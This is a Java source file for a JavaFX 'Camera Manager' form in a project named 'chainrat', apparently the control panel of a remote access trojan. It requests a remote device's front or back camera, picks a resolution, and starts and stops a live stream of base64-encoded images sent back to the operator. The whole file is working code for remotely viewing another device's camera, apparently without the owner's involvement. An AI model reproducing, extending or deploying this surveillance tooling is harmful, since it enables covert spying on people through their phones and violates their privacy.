package com.nefi.chainrat.server.forms;

import com.nefi.chainrat.server.FPSCounter;
import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.log.Log;
import com.nefi.chainrat.server.network.ControlServer.CommandType;
import com.nefi.chainrat.server.network.ControlServer.Connection;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraRequest;
import com.nefi.chainrat.server.network.ControlServer.packets.CameraResponse;
import com.nefi.chainrat.server.network.ControlServer.packets.Packet;
import com.sun.glass.ui.Size;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.embed.swing.SwingFXUtils;
import javafx.event.ActionEvent;
import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.StackPane;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.text.DecimalFormat;
import java.util.Base64;
import java.util.ResourceBundle;

public class frmCameraManager implements Initializable {
    public TitledPane gPaneSettings;
    public RadioButton rbFront;
    public RadioButton rbBack;
    public CheckBox cbCompression;
    public ComboBox comboSize;
    public Button btnStartStream;
    public ImageView imageView;
    public TitledPane gPaneImage;
    public Button btnStopStream;
    public StackPane imgStackPane;
    public Label lbFPS;


    private Log log;
    private Connection connection;
    private ToggleGroup toggleGroup = new ToggleGroup();
    public static final ObservableList<String> clientEntries = FXCollections.observableArrayList();

    private Size[] frontSizes = new Size[]{};
    private Size[] backSizes = new Size[]{};

    private FPSCounter fpsCounter = new FPSCounter(5);
    private DecimalFormat decimalFormat = new DecimalFormat("#.00");

    public frmCameraManager(Connection connection){
        this.connection = connection;
       // btnStartStream.setVisible(false);
    }

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        this.log = Main.getLog();
        this.rbFront.setToggleGroup(this.toggleGroup);
        this.rbBack.setToggleGroup(this.toggleGroup);
        this.btnStartStream.setDisable(true);

        //make image fit screen

        //Make request
        CameraRequest cr = new CameraRequest(true, false, 0, 0, false);
        Packet packet = new Packet(CommandType.CAMERA_REQUEST, Main.serialize(cr, CameraRequest.class));

        connection.channel.writeAndFlush(packet);
    }
    public void onImageReceived(String base64image){
        //Got image
        //Client:
        //byte[] pictureData
        //String encoded = Base64.encodeToString(pictureData, Base64.DEFAULT);
        //Packet out = new Packet(CommandType.IMAGE, encoded);
        //Log.d(TAG, "GOT IMAGE");
        byte[] pictureData = org.apache.commons.codec.binary.Base64.decodeBase64(base64image);
        Image img = new Image(new ByteArrayInputStream(pictureData));



        fpsCounter.nextFrame();
        imageView.setImage(img);
        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                lbFPS.setText(decimalFormat.format(fpsCounter.getAverageFps()) + " FPS");
            }
        });
    }

    public void onInfoReceived(CameraResponse packet){
        //Convert to size
        frontSizes = new Size[packet.frontWidth.length];
        backSizes = new Size[packet.backWidth.length];

        for(int i = 0; i < packet.frontWidth.length; i++){
            frontSizes[i] = new Size(packet.frontWidth[i], packet.frontHeight[i]);
        }
        for (int i = 0; i < packet.backWidth.length; i++){
            backSizes[i] = new Size(packet.backWidth[i], packet.backHeight[i]);
        }
        updateSizes();
        //Start Button is disabled by default enable it
        btnStartStream.setDisable(false);
    }

    public void btnStartStream_Click(ActionEvent actionEvent) {
        log.d(this, "Starting image stream...");
        btnStartStream.setVisible(false);
        btnStartStream.setDisable(true);
        btnStopStream.setVisible(true);
        btnStopStream.setDisable(false);

        //Send start command
        boolean useFront = rbFront.isSelected();
        String[] dimensions = comboSize.getSelectionModel().getSelectedItem().toString().split("x");
        int width = Integer.parseInt(dimensions[0]);
        int height = Integer.parseInt(dimensions[1]);
        CameraRequest cr = new CameraRequest(useFront, true, width, height, false);
        Packet packet = new Packet(CommandType.CAMERA_REQUEST, Main.serialize(cr, CameraRequest.class));
        connection.channel.writeAndFlush(packet);
    }

    public void btnStopStream_Click(ActionEvent actionEvent) {
        log.d(this, "Stopping image stream...");
        btnStopStream.setDisable(true);
        btnStopStream.setVisible(false);
        btnStartStream.setVisible(true);
        btnStartStream.setDisable(false);

        //send stop command
        CameraRequest cr = new CameraRequest(true, true, 1, 1, true);
        Packet packet = new Packet(CommandType.CAMERA_REQUEST, Main.serialize(cr, CameraRequest.class));
        connection.channel.writeAndFlush(packet);
    }

    public void comboSize_changed(ActionEvent actionEvent) {
    }

    public void rbChanged(ActionEvent actionEvent) {
        updateSizes();
    }

    public void updateSizes(){
        final Size[] sizes = rbFront.isSelected() ? frontSizes : backSizes;
        clientEntries.clear();
        for(final Size size : sizes){
            clientEntries.add(size.width + "x" + size.height);
        }

        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                comboSize.getSelectionModel().clearSelection();
                comboSize.setValue(null);
                comboSize.setItems(clientEntries);
                comboSize.getSelectionModel().select(0);
            }
        });
    }
}
